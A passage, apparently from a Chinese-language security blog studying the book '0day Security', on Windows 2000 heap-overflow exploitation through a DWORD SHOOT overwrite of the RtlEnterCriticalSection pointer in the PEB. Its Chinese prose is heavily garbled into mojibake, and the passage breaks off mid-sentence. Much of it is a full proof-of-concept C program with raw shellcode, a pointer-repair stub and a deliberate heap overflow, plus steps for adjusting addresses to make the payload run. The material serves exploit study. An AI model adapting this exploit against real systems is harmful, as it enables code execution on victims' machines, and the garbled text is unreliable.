SHOOTÂèØ‰ª•Êõ¥ÊîπÂÜÖÂ≠ò‰∏≠‰ªªÊÑèÂú∞ÂùÄÁöÑÊï∞ÊçÆ„ÄÇ</p></li><li><p>‰ª£Á†ÅÈÄªËæëÔºö‰øÆÊîπ‰ª£Á†ÅÊÆµÈáçË¶ÅÂáΩÊï∞ÁöÑÂÖ≥ÈîÆÈÄªËæëÊúâÊó∂ÂèØ‰ª•ËææÂà∞‰∏ÄÂÆöÊîªÂáªÊïàÊûú„ÄÇ‰æãÂ¶ÇÔºåÁ®ãÂ∫èÂàÜÊîØÂ§ÑÁöÑÂà§Êñ≠ÈÄªËæëÔºåÊàñËÄÖÊääË∫´‰ªΩËÆ§ËØÅÂáΩÊï∞ÁöÑË∞ÉÁî®Êåá‰ª§Ë¶ÜÁõñ‰∏∫0x90(nop)„ÄÇËøôÁßçÊñπÊ≥ïÊúâÁÇπÁ±ª‰ºº‰∫éËΩØ‰ª∂Á†¥Ëß£ÊäÄÊúØ‰∏≠ÁöÑ‚ÄùÁàÜÁ†¥‚Äú‚Äî‚ÄîÈÄöËøáÊõ¥Êîπ‰∏Ä‰∏™Â≠óËäÇËÄåÊîπÂèòÊï¥‰∏™Á®ãÂ∫èÁöÑÊµÅÁ®ãÔºåÁ¨¨1Á´†‰∏≠ÁöÑÁ†¥Ëß£Â∞èËØïÈ™åÂ∞±ÊòØËøôÁßçÂ∫îÁî®ÁöÑ‰æãÂ≠ê„ÄÇ</p></li><li><p>ÂáΩÊï∞ËøîÂõûÂú∞ÂùÄÔºöÊ†àÊ∫¢Âá∫‰øÆÊîπÂáΩÊï∞ËøîÂõûÂú∞ÂùÄËÉΩÂ§üÂä´ÊåÅËøõÁ®ãÔºåÂ†ÜÊ∫¢Âá∫‰πü‰∏ÄÊ†∑ÂèØ‰ª•Âà©Áî®DWORD SHOOTÊõ¥ÊîπÂáΩÊï∞ËøîÂõûÂú∞ÂùÄ„ÄÇ‰ΩÜÁî±‰∫éÊ†àÂ∏ßÁßª‰ΩçÁöÑÂéüÂõ†ÔºåÂáΩÊï∞ËøîÂõûÂú∞ÂùÄÂæÄÂæÄÊòØ‰∏çÂõ∫ÂÆöÁöÑ„ÄÇÁîöËá≥Âú®Âêå‰∏ÄÊìç‰ΩúÁ≥ªÁªüÂíåË°•‰∏ÅÁâàÊú¨‰∏ãËøûÁª≠ËøêË°å‰∏§Ê¨°Ê†àÁä∂ÊÄÅÈÉΩ‰ºöÊúâ‰∏çÂêåÔºåÊïÖDWORD SHOOTÂú®ËøôÁßçÊÉÖÂÜµ‰∏ãÊúâ‰∏ÄÂÆöÂ±ÄÈôêÊÄßÔºåÂõ†‰∏∫ÁßªÂä®ÁöÑÈù∂Â≠ê‰∏çÂ•ΩÁûÑÂáÜ„ÄÇ</p></li><li><p>ÊîªÂáªÂºÇÂ∏∏Â§ÑÁêÜÊú∫Âà∂ÔºöÂΩìÁ®ãÂ∫è‰∫ßÁîüÂºÇÂ∏∏Êó∂ÔºåWindows‰ºöËΩ¨ÂÖ•ÂºÇÂ∏∏Â§ÑÁêÜÊú∫Âà∂„ÄÇÂ†ÜÊ∫¢Âá∫ÂæàÂÆπÊòìÂºïËµ∑ÂºÇÂ∏∏ÔºåÂõ†Ê≠§ÂºÇÂ∏∏Â§ÑÁêÜÊú∫Âà∂ÊâÄ‰ΩøÁî®ÁöÑÈáçË¶ÅÊï∞ÊçÆÁªìÊûÑÂæÄÂæÄ‰ºöÊàê‰∏∫DWORD SHOOTÁöÑ‰∏äÁ≠âÁõÆÊ†áÔºåËøôÂåÖÊã¨S.E.HÔºàstructure exception handlerÔºâ„ÄÅF.V.E.HÔºàFirst Vectored Exception HandlerÔºâ„ÄÅËøõÁ®ãÁéØÂ¢ÉÂùóÔºàP.E.BÔºâ‰∏≠ÁöÑU.E.FÔºàUnhandled Exception FilterÔºâ„ÄÅÁ∫øÁ®ãÁéØÂ¢ÉÂùóÔºàT.E.BÔºâ‰∏≠Â≠òÊîæÁöÑÁ¨¨‰∏Ä‰∏™S.E.HÊåáÈíàÔºàT.E.HÔºâ„ÄÇ</p></li><li><p>ÂáΩÊï∞ÊåáÈíàÔºöÁ≥ªÁªüÊúâÊó∂‰ºö‰ΩøÁî®‰∏Ä‰∫õÂáΩÊï∞ÊåáÈíàÔºåÊØîÂ¶ÇË∞ÉÁî®Âä®ÊÄÅÈìæÊé•Â∫ì‰∏≠ÁöÑÂáΩÊï∞„ÄÅC++‰∏≠ÁöÑËôöÂáΩÊï∞Ë∞ÉÁî®Á≠â„ÄÇÊîπÂÜôËøô‰∫õÂáΩÊï∞ÊåáÈíàÂêéÔºåÂú®ÂáΩÊï∞Ë∞ÉÁî®ÂèëÁîüÂêéÂæÄÂæÄÂèØ‰ª•ÊàêÂäüÂä´ÊåÅËøõÁ®ã„ÄÇ‰ΩÜÂèØÊÉúÁöÑÊòØÔºå‰∏çÊòØÊØè‰∏Ä‰∏™ÊºèÊ¥ûÈÉΩÂèØ‰ª•‰ΩøÁî®ËøôÈ°πÊäÄÊúØÔºåËøôÂèñÂÜ≥‰∫éËΩØ‰ª∂ÁöÑÂºÄÂèëÊñπÂºè„ÄÇ</p></li><li><p>P.E.B‰∏≠Á∫øÁ®ãÂêåÊ≠•ÂáΩÊï∞ÁöÑÂÖ•Âè£Âú∞ÂùÄÔºöÂ§©ÊâçÁöÑÈªëÂÆ¢‰ª¨ÂèëÁé∞Âú®ÊØè‰∏™ËøõÁ®ãÁöÑP.E.B‰∏≠ÈÉΩÂ≠òÊîæÁùÄ‰∏ÄÂØπÂêåÊ≠•ÂáΩÊï∞ÊåáÈíàÔºåÊåáÂêëRtlEnterCriticalSection()ÂíåRtlLeaveCriticalSection()ÔºåÂπ∂‰∏îÂú®ËøõÁ®ãÈÄÄÂá∫Êó∂‰ºöË¢´ExitProcess()Ë∞ÉÁî®„ÄÇÂ¶ÇÊûúËÉΩÂ§üÈÄöËøáDWORD SHOOT‰øÆÊîπËøôÂØπÊåáÈíà‰∏≠ÁöÑÂÖ∂‰∏≠‰∏Ä‰∏™ÔºåÈÇ£‰πàÂú®Á®ãÂ∫èÈÄÄÂá∫Êó∂ExitProcess()Â∞Ü‰ºöË¢´È™óÂéªË∞ÉÁî®Êàë‰ª¨ÁöÑshellcode„ÄÇÁî±‰∫éP.E.BÁöÑ‰ΩçÁΩÆÂßãÁªà‰∏ç‰ºöÂèòÂåñÔºåËøôÂØπÊåáÈíàÂú®P.E.B‰∏≠ÁöÑÂÅèÁßª‰πüÂßãÁªà‰∏çÂèòÔºåËøô‰ΩøÂæóÂà©Áî®Â†ÜÊ∫¢Âá∫ÂºÄÂèëÂá∫ÈÄÇÁî®‰∫é‰∏çÂêåÊìç‰ΩúÁ≥ªÁªüÁâàÊú¨ÂíåË°•‰∏ÅÁâàÊú¨ÁöÑexploitÊàê‰∏∫ÂèØËÉΩ„ÄÇËøôÁßçÊñπÊ≥ï‰∏ÄÁªèÊèêÂá∫Â∞±Á´ãÂàªÊàê‰∏∫WindowsÂπ≥Âè∞‰∏ãÂ†ÜÊ∫¢Âá∫Âì≠‰∏ÄËæπÁªôÁöÑÊòØÊúÄÁªèÂÖ∏ÊñπÊ≥ï‰πã‰∏ÄÔºåÂõ†‰∏∫ÈùôÊ≠¢ÁöÑÈù∂Â≠êÊØîÊ¥ªÂä®ÁöÑÈù∂Â≠êÂ•ΩÊâìÂæóÂ§öÔºåÊàë‰ª¨Âè™ÈúÄË¶ÅÊääÊû™Êû∂Â•ΩÔºåÈó≠ÁùÄÁúºÁùõÊâ£Êâ≥Êú∫Â∞±ÊòØ‰∫Ü„ÄÇ</p></li></ol><footer><strong>ÁéãÊ∏Ö</strong><cite>„Ää0dayÂÆâÂÖ®ÔºöËΩØ‰ª∂ÊºèÊ¥ûÂàÜÊûêÊäÄÊúØ„Äã(Á¨¨‰∫åÁâà) -> P169-170</cite></footer></blockquote><h4 id="Âà©Áî®p.e.bËøõÁ®ãÁéØÂ¢ÉÂùóÂÆûÊñΩÊîªÂáª">(1) Âà©Áî®P.E.BÔºàËøõÁ®ãÁéØÂ¢ÉÂùóÔºâÂÆûÊñΩÊîªÂáª</h4><h5 id="p.e.bÂà©Áî®ÂéüÁêÜ">1) P.E.BÂà©Áî®ÂéüÁêÜ</h5><blockquote><p>Windows‰∏∫‰∫ÜÂêåÊ≠•ËøõÁ®ã‰∏ãÁöÑÂ§ö‰∏™Á∫øÁ®ãÔºå‰ΩøÁî®‰∫Ü‰∏Ä‰∫õÂêåÊ≠•Êé™ÊñΩÔºåÂ¶ÇÈîÅÊú∫Âà∂ÔºàlockÔºâ„ÄÅ‰ø°Âè∑ÈáèÔºàsemaphoreÔºâ„ÄÅ‰∏¥ÁïåÂå∫Ôºàcritical sectionÔºâÁ≠â„ÄÇËÆ∏Â§öÊìç‰ΩúÈÉΩË¶ÅÁî®Âà∞Ëøô‰∫õÂêåÊ≠•Êú∫Âà∂„ÄÇ</p><p>ÂΩìËøõÁ®ãÈÄÄÂá∫Êó∂ÔºåExitProcess()ÂáΩÊï∞Ë¶ÅÂÅöÂæàÂ§öÂñÑÂêéÂ∑•‰ΩúÔºåÂÖ∂‰∏≠ÂøÖÁÑ∂ÈúÄË¶ÅÁî®Âà∞‰∏¥ÁïåÂå∫ÂáΩÊï∞RtlEnterCriticalSection()ÂíåRtlLeaveCriticalSection()Êù•ÂêåÊ≠•Á∫øÁ®ãÈò≤Ê≠¢‚ÄúËÑèÊï∞ÊçÆ‚ÄùÁöÑ‰∫ßÁîü„ÄÇ</p><p>‰∏çÁü•‰ªÄ‰πàÂéüÂõ†ÔºåÂæÆËΩØÁöÑÂ∑•Á®ãÂ∏à‰ºº‰πéÂ†ÜExitProcess()ÊÉÖÊúâÁã¨ÈíüÔºåÂõ†‰∏∫ÂÆÉË∞ÉÁî®‰∏¥ÁïåÂå∫ÁöÑÊñπÊ≥ïÊØîËæÉÁâπÊÆäÔºåÊòØÈÄöËøáËøõÁ®ãÁéØÂ¢ÉÂùóP.E.B‰∏≠ÂÅèÁßª0x20Â§ÑÂ≠òÊîæÁöÑÂáΩÊï∞ÊåáÈíàÊù•Èó¥Êé•ÂÆåÊàêÁöÑ„ÄÇÂÖ∑‰ΩìËØ¥Êù•Â∞±ÊòØÂú®0x7FFDF020Â§ÑÂ≠òÊîæÁùÄÊåáÂêëRtlEnterCriticalSection()ÁöÑÊåáÈíàÔºåÂú®0x7FFDF024Â§ÑÂ≠òÊîæÁùÄÊåáÂêëRtlLeaveCriticalSection()ÁöÑÊåáÈíà„ÄÇ</p><p><em><strong>È¢òÂ§ñËØùÔºö‰ªéWindows 2003 ServerÂºÄÂßãÔºåÂæÆËΩØÂ∑≤Áªè‰øÆÊîπ‰∫ÜËøôÈáåÁöÑÂÆûÁé∞„ÄÇ</strong></em></p><footer><strong>ÁéãÊ∏Ö</strong><cite>„Ää0dayÂÆâÂÖ®ÔºöËΩØ‰ª∂ÊºèÊ¥ûÂàÜÊûêÊäÄÊúØ„Äã(Á¨¨‰∫åÁâà) -> P170</cite></footer></blockquote><h5 id="ÂÆûÈ™å">2) ÂÆûÈ™å</h5><p>Êú¨ÂÆûÈ™åÈÄöËøáÊ∑πÊ≤°Â∞æÂùóÂùóÈ¶ñÔºåÊù•Ëß¶ÂèëDWORD SHOOT‰ª•‰øÆÊîπP.E.B‰∏≠0x20Â§ÑÂ≠òÊîæÁöÑÊåáÂêëRtlEnterCriticalSection()ÂáΩÊï∞ÁöÑÊåáÈíàÔºåÂØºËá¥Á®ãÂ∫èÈúÄË¶ÅË∞ÉÁî®ÂÆÉÊó∂ÂÆûÈôÖÂç¥ÊâßË°å‰∫Üshellcode„ÄÇ</p><p>ÂÆûÈ™å‰ª£Á†ÅÂ¶Ç‰∏ã:</p><figure class="highlight c"><figcaption><span>„Ää0dayÂÆâÂÖ®ÔºöËΩØ‰ª∂ÊºèÊ¥ûÂàÜÊûêÊäÄÊúØ„Äã(Á¨¨‰∫åÁâà) -> P171 -> heap_PEB.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*****************************************************************************</span></span><br><span class="line"><span class="comment">      To be the apostrophe which changed "Impossible" into "I'm possible"!</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">POC code of chapter 6.4 in book "Vulnerability Exploit and Analysis Technique"</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment">file name: heap_PEB.c</span></span><br><span class="line"><span class="comment">author: failwest  </span></span><br><span class="line"><span class="comment">date: 2007.04.04</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">description: demo show of heap overrun, shellcode was executed</span></span><br><span class="line"><span class="comment">  function pointer of RtlEnterCriticalSection was changed in PEB</span></span><br><span class="line"><span class="comment">  via DWORD shooting</span></span><br><span class="line"><span class="comment">  Some address may need to reset via run time debugging</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Noticed:1 only run on windows 2000</span></span><br><span class="line"><span class="comment">2 complied with VC 6.0</span></span><br><span class="line"><span class="comment">3 build into release version</span></span><br><span class="line"><span class="comment">4 used for run time debugging</span></span><br><span class="line"><span class="comment">version: 1.0</span></span><br><span class="line"><span class="comment">E-mail: failwest@gmail.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Only for educational purposes    enjoy the fun from exploiting :)</span></span><br><span class="line"><span class="comment">******************************************************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">char shellcode[]=</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";//200 bytes 0x90</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">char shellcode[]=</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"</span></span><br><span class="line"><span class="comment">"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"</span></span><br><span class="line"><span class="comment">"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"</span></span><br><span class="line"><span class="comment">"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"</span></span><br><span class="line"><span class="comment">"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"</span></span><br><span class="line"><span class="comment">"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"</span></span><br><span class="line"><span class="comment">"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"</span></span><br><span class="line"><span class="comment">"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"</span></span><br><span class="line"><span class="comment">"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"</span></span><br><span class="line"><span class="comment">"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"</span></span><br><span class="line"><span class="comment">"\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x16\x01\x1A\x00\x00\x10\x00\x00"// head of the ajacent free block</span></span><br><span class="line"><span class="comment">"\x88\x06\x52\x00\x20\xf0\xfd\x7f";</span></span><br><span class="line"><span class="comment">//0x00520688 is the address of shellcode in first heap block </span></span><br><span class="line"><span class="comment">//0x7ffdf020 is the position in PEB which hold a pointer to RtlEnterCriticalSection()</span></span><br><span class="line"><span class="comment">//and will be called by ExitProcess() at last</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> shellcode[]=</span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">//repaire the pointer which shooted by heap over run</span></span><br><span class="line"><span class="string">"\xB8\x20\xF0\xFD\x7F"</span>  <span class="comment">//MOV EAX,7FFDF020</span></span><br><span class="line"><span class="string">"\xBB\x4C\xAA\xF8\x77"</span>  <span class="comment">//MOV EBX,77F8AA4C the address here may releated to your OS</span></span><br><span class="line"><span class="string">"\x89\x18"</span><span class="comment">//MOV DWORD PTR DS:[EAX],EBX</span></span><br><span class="line"><span class="string">"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"</span></span><br><span class="line"><span class="string">"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"</span></span><br><span class="line"><span class="string">"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"</span></span><br><span class="line"><span class="string">"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"</span></span><br><span class="line"><span class="string">"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"</span></span><br><span class="line"><span class="string">"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"</span></span><br><span class="line"><span class="string">"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"</span></span><br><span class="line"><span class="string">"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"</span></span><br><span class="line"><span class="string">"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"</span></span><br><span class="line"><span class="string">"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"</span></span><br><span class="line"><span class="string">"\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x16\x01\x1A\x00\x00\x10\x00\x00"</span><span class="comment">// head of the ajacent free block</span></span><br><span class="line"><span class="string">"\x88\x06\x52\x00\x20\xf0\xfd\x7f"</span>;</span><br><span class="line"><span class="comment">//0x00520688 is the address of shellcode in first heap block, you have to make sure this address via debug </span></span><br><span class="line"><span class="comment">//0x7ffdf020 is the position in PEB which hold a pointer to RtlEnterCriticalSection()</span></span><br><span class="line"><span class="comment">//and will be called by ExitProcess() at last</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">HLOCAL h1 = <span class="number">0</span>, h2 = <span class="number">0</span>;</span><br><span class="line">HANDLE hp;</span><br><span class="line">hp = HeapCreate(<span class="number">0</span>,<span class="number">0x1000</span>,<span class="number">0x10000</span>);</span><br><span class="line">h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">200</span>);</span><br><span class="line"><span class="comment">//__asm int 3 //used to break the process</span></span><br><span class="line"><span class="comment">//memcpy(h1,shellcode,200); //normal cpy, used to watch the heap</span></span><br><span class="line"><span class="built_in">memcpy</span>(h1,shellcode,<span class="number">0x200</span>); <span class="comment">//overflow,0x200=512</span></span><br><span class="line">h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÁºñËØëÁéØÂ¢ÉÂ¶Ç‰∏ãÔºö</p><ul><li>Êìç‰ΩúÁ≥ªÁªüÔºöËøêË°å‰∫éVmwareËôöÊãüÊú∫ÔºåÁâàÊú¨Win 2K SP4 5.00.2195 EN</li><li>ÁºñËØëÂô®ÔºöVisual C++ 6.0</li><li>ÁºñËØëÈÄâÈ°πÔºöÈªòËÆ§ÈÄâÈ°π</li><li>buildÁâàÊú¨ÔºöreleaseÁâà</li></ul><p>‰ª£Á†Å‰∏≠Á¨¨3‰∏™‰∏∫ÊúÄÁªàÁâàÊú¨ÁöÑshellcodeÔºåËøô‰∏™shellcodeÊïàÊûúÊòØÊâßË°åMessageBoxA()ÂºπÂá∫‰∏Ä‰∏™ÂØπËØùÊ°ÜÔºå‰ΩÜÊçÆ0day‰π¶‰∏≠Ëß£ÈáäÔºåshellcode‰∏≠Ë∞ÉÁî®ÁöÑÂáΩÊï∞‰πüÈúÄË¶Å‰ΩøÁî®‰∏¥ÁïåÂå∫ÔºåÂõ†Ê≠§Âú®ÂÖ∂ÊâßË°åËøáÁ®ã‰∏≠‰πüÈúÄË¶ÅË∞ÉÁî®P.E.B‰∏≠0x20ÂÅèÁßªÂ§ÑÁöÑÊåáÈíàÊåáÂêëÁöÑRtlEnterCriticalSection()ÂáΩÊï∞Ôºå‰ΩÜËØ•Â§ÑÁöÑÂáΩÊï∞ÊåáÈíàÂú®shellcodeÊâßË°åÊó∂Â∑≤ÁªèË¢´Êàë‰ª¨ÊéâÂåÖÔºåÂõ†Ê≠§‰ºöÂØºËá¥shellcode‰∏≠ÁöÑÂáΩÊï∞ÊâßË°å‰∏çÊàêÂäü„ÄÇ‰∏∫‰∫ÜÈÅøÂÖçËøô‰∏™ÈóÆÈ¢òÔºåÈúÄË¶ÅÂú®shellcodeË∞ÉÁî®ÂÖ≥ÈîÆÂáΩÊï∞Ââç‰øÆÂ§çËØ•Â§ÑÁöÑÂÄºÔºåshellcode‰∏≠77-79Ë°åÁöÑ‰ª£Á†ÅÂ∞±ÊòØËøõË°å‰øÆÂ§çÂ∑•‰ΩúÁöÑ„ÄÇ</p><p>È¶ñÂÖàÔºåÂéªÊéâ‰ª£Á†Å104Ë°åÂ§ÑÁöÑÊ≥®ÈáäÔºåÈÄöËøáINT 3‰∏≠Êñ≠ËøõÂÖ•OllyDBGËøõË°åË∞ÉËØï„ÄÇ</p><p>Áî±‰∫éRtlEnterCriticalSection()ÂáΩÊï∞ÁöÑÂÆûÈôÖÂú∞ÂùÄÂú®‰∏çÂêåÊìç‰ΩúÁ≥ªÁªü‰∏äÊúâÊâÄÂ∑ÆÂºÇÔºåÂõ†Ê≠§Ê≠§Â§ÑÈúÄË¶ÅÊâãÂä®Á°ÆÂÆöÔºåÁî±‰∫éP.E.BÁöÑÂú∞ÂùÄÊòØÂõ∫ÂÆöÁöÑÔºå‰∏∫0x7FFDF000ÔºåÂõ†Ê≠§Âú®ÂÜÖÂ≠òÊü•ÁúãÁ™óÂè£‰∏≠ÈÄöËøáCtrl+GÂπ∂ÈîÆÂÖ•0x7FFDF020Êù•Âà∞ÂÖ∂ÂÅèÁßª0x20Â§ÑËßÇÂØüÔºåÂæóÂà∞Âú®ÊàëÁöÑÁ≥ªÁªü‰∏≠RtlEnterCriticalSection()ÂáΩÊï∞ÁöÑÂú∞ÂùÄ‰∏∫0x77F82060ÔºåÂõ†Ê≠§Â∞Üshellcode‰∏≠78Ë°åÂ§ÑÁöÑ‰øÆÂ§ç‰ª£Á†Å‰∏≠ÁöÑËØ•ÂáΩÊï∞Âú∞ÂùÄËøõË°å‰øÆÊîπÔºåÊú¨Ë°åÊï¥‰ΩìÊîπ‰∏∫&quot;6020877&quot;ÔºåÂÖ∂‰∏≠EBXÁöÑÊú∫Âô®Á†Å„ÄÇ</p><p>Êé•ÁùÄÔºåËßÇÂØüshellcode‰∏≠Á¨¨92Ë°åÔºå0day‰π¶‰∏≠Â∞æÂùóÁöÑÂú∞ÂùÄ‰∏∫0x00520688ÔºåËÄåÊàëÁöÑÊú∫Âô®‰∏ä‰∏∫0x00360688ÔºåÂõ†Ê≠§Â∞ÜÂÖ∂‰∏≠ÁöÑ52‰øÆÊîπ‰∏∫36Âç≥ÂèØ„ÄÇ</p><p>ÊúÄÂêéÔºåÂÜçÂ∞ÜÁ¨¨104Ë°åÁöÑINT 3‰∏≠Êñ≠Ê≥®ÈáäÊéâÔºåÈáçÊñ∞ÁºñËØëËøêË°åÁ®ãÂ∫èÔºåÂç≥ÂèØÊàêÂäüÂºπÁ™ó„ÄÇËøôÈáåÊúâ‰∏™ÈóÆÈ¢òÔºåÂ¶ÇÊûú‰∏çÊ≥®ÈáäÊéâËØ•Ë°å‰ª£Á†ÅÔºåINT 